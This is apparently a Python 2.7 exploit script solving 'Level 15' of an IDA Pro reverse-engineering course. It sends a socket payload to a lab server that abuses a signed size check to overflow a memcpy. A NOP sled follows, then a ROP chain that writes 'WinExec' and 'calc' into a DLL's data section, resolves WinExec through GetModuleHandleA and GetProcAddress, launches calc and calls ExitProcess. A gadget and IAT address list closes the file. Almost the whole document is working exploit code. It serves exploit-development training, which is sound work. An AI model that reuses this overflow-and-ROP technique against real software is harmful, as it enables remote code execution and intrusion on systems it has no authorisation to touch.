# Python 2.7 x86
# Solution for auto evaluation: Level 15
# Curso IDA Pro de Ricardo Narvaja.
# by @rextco
import string
import random
import struct
import socket


def read_file(file_name):
    with open(file_name, "rb") as f:
        content = f.read()
    return bytearray(content)


def write_file(file_name, content):
    with open(file_name, "wb") as f:
        f.write(content)


def random_word(length):
    letters = string.ascii_uppercase
    return "".join(random.choice(letters) for char in range(length))


def exploit_remote(host, port, file_cache=False):
    print("Exploit!Socket!Call")
    print("DebugMode!FileCache = {}".format(file_cache))

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        print("[*] Starting connection to host: %s and port: %s" % (host, port))
        s.connect((host, port))
        print("recv = {:s}".format(s.recv(0x30)))

        if file_cache:
            stuff = read_file("debug_bad_food.txt")
        else:
            size_of_rop = 4 * 38
            stuff = ""
            stuff += struct.pack("<L", 0x0)                     # n
            stuff += struct.pack("<L", 0xFFFFFFFF)              # n + 1 > n - (n + 1) = -1
            stuff += struct.pack("<L", 0x1224 + size_of_rop)    # size para el memcpy
            stuff += struct.pack("<L", 0x89765432)              # check for exit of while loop

            stuff += "\x90" * (0x1224 - len(stuff))

            # Write "WinExec" on .data section | 0x10198010
            stuff += struct.pack("<L", 0x10001F9C)              # pop ecx ; retn
            stuff += struct.pack("<L", 0x456e6957)              # string=WinE
            stuff += struct.pack("<L", 0x1000A5EF)              # pop eax ; retn
            stuff += struct.pack("<L", 0x10198010 - 8)          # .data address W on .dll
            stuff += struct.pack("<L", 0x10122016)              # mov [eax+8], ecx
            stuff += struct.pack("<L", 0x100BE66E)              # add eax, 4 ; retn
            stuff += struct.pack("<L", 0x10001F9C)              # pop ecx ; retn
            stuff += struct.pack("<L", 0x636578)                # string=xec
            stuff += struct.pack("<L", 0x10122016)              # mov [eax+8], ecx

            # Write "calc" on .data section | 0x10198018
            stuff += struct.pack("<L", 0x100BE66E)              # add eax, 4 ; retn
            stuff += struct.pack("<L", 0x10001F9C)              # pop ecx ; retn
            stuff += struct.pack("<L", 0x636c6163)              # string=calc
            stuff += struct.pack("<L", 0x10122016)              # mov [eax+8], ecx

            # Call GetModuleHandleA
            stuff += struct.pack("<L", 0x100027AA)              # pop esi ; retn
            stuff += struct.pack("<L", 0x1014C360)              # IAT GetModuleHandleA
            stuff += struct.pack("<L", 0x10053B37)              # call dword ptr [esi] ; pop esi ; pop edi ; pop ebp ; retn 4
            stuff += struct.pack("<L", 0x1014DFFC)              # arg_0 = ptr_string (Kernel32.dll)
            stuff += struct.pack("<L", 0x90909090)              # padding
            stuff += struct.pack("<L", 0x90909090)              # padding
            stuff += struct.pack("<L", 0x90909090)              # padding
            stuff += struct.pack("<L", 0x100027AA)              # (next gadget) pop esi; retn
            stuff += struct.pack("<L", 0x90909090)              # padding

            # Call GetProcAddress
            # stuff += struct.pack("<L", 0x100027AA)            # pop esi; retn
            stuff += struct.pack("<L", 0x1014C358)              # IAT GetProcAddress
            stuff += struct.pack("<L", 0x10053B36)              # push eax ; call dword ptr [esi] ; pop esi ; pop edi ; pop ebp ; retn 4
                                                                # arg_0 = Base module of kernel32.dll
            stuff += struct.pack("<L", 0x10198010)              # arg_1 = ptr_string (WinExec)
            stuff += struct.pack("<L", 0x90909090)              # padding
            stuff += struct.pack("<L", 0x90909090)              # padding
            stuff += struct.pack("<L", 0x90909090)              # padding
            stuff += struct.pack("<L", 0x100183E6)              # (next gadget) push eax ; ret
            stuff += struct.pack("<L", 0x90909090)              # padding

            # Call WinExec
            # stuff += struct.pack("<L", 0x100183E6)            # push eax ; ret
            stuff += struct.pack("<L", 0x100027AA)              # next gadget (pop esi ; retn)
            stuff += struct.pack("<L", 0x10198018)              # arg_0 = ptr_string (calc)
            stuff += struct.pack("<L", 0x1)                     # arg_1 = SW_SHOWNORMAL = 1

            # Call ExitProcess
            # stuff += struct.pack("<L", 0x100027AA)            # pop esi ; retn
            stuff += struct.pack("<L", 0x1014C214)              # IAT ExitProcess
            stuff += struct.pack("<L", 0x10053B37)              # call dword ptr [esi] ; pop esi ; pop edi ; pop ebp ; retn 4
            stuff += struct.pack("<L", 0x0)                     # arg_0 = 0

            stuff += struct.pack("<L", 0x90909090)              # padding  << 37 dwords
            stuff += struct.pack("<L", 0x90909090)              # padding  << 38 dwords
            # stuff += "\x41" * 4
            # stuff += "\x42" * 4
            write_file("debug_bad_food.txt", stuff)

        print("length = {:d}".format(len(stuff)))
        s.send(stuff + "\n")

    except Exception as e:
        s.close()
        raise e

    s.close()


if __name__ == "__main__":
    # exploit_remote(host="192.168.1.4", port=8888, file_cache=False)
    exploit_remote(host="192.168.1.20", port=8888, file_cache=False)


# Work under: Windows 7
# Gadgets
# 0x100183E6 push eax ; ret
# 0x10122016 mov [eax+8], ecx ; retn
# 0x10001F9C pop ecx ; retn
# 0x1000A5EF pop eax ; retn
# 0x100BE66E add eax, 4 ; retn
# 0x100027AA pop esi ; retn
# 0x10053B37 call dword ptr [esi] ; pop esi ; pop edi ; pop ebp ; retn 4
# 0x10053B36 push eax ; call dword ptr [esi] ; pop esi ; pop edi ; pop ebp ; retn 4


# Address
# 0x1014C358 IAT GetProcAddress
# 0x1014C360 IAT GetModuleHandleA(LPCSTR lpModuleName)
# 0x1014C214 ExitProcess
# 0x1014DFFC String Kernel32.dll
